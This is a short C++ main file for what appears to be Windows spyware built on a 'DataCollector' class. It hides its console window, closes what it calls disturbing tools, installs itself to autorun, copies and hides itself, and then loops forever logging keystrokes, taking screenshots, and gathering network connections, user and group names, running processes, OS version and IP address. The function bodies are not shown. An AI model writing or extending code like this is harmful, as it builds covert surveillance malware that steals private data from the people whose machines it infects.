#include "DataCollector.h"

int main(void)
{
	DataCollector data;
	ShowWindow(GetConsoleWindow(), SW_HIDE); // hide the cmd window
	data.closeDisturbingTools();
	data.changeBackground();
	data.autoRun();
	data.programCopy();
	while(true)
	{
		data.keyLogging();
		data.screenShot((data.getPathstr() + "screenShot.png").c_str());
		data.netStat();
		data.findUserName();
		data.findGroups();
		data.winVersion(data.getCounter() == 0);
		data.findProcesses();
		data.findIP();
		if (data.getCounter() == 0)
		{
			data.hideFile();
		}
		data.increaseCounter();
	}
	return 0;
}